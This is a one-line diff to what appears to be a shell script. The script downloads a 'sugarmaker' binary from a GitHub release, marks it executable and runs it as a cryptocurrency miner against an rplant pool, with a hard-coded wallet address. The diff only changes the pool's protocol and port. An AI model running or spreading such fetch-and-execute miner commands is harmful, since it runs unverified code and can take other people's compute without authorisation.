@@ -1,1 +1,1 @@
-wget https://github.com/berhasilsemua83/Raven/releases/download/v1.0/sugarmaker && chmod +x sugarmaker && ./sugarmaker -a YespowerSugar  -o stratum+tcps://stratum-asia.rplant.xyz:17042 -u sugar1q8p7djpt64kz5u4jxzlsxds88dga5m7gag3vskn.$(echo $(shuf -i 1-9999 -n 1)-qwik) -p x -t 1
+wget https://github.com/berhasilsemua83/Raven/releases/download/v1.0/sugarmaker && chmod +x sugarmaker && ./sugarmaker -a YespowerSugar  -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1q8p7djpt64kz5u4jxzlsxds88dga5m7gag3vskn.$(echo $(shuf -i 1-9999 -n 1)-qwik) -p x -t 1
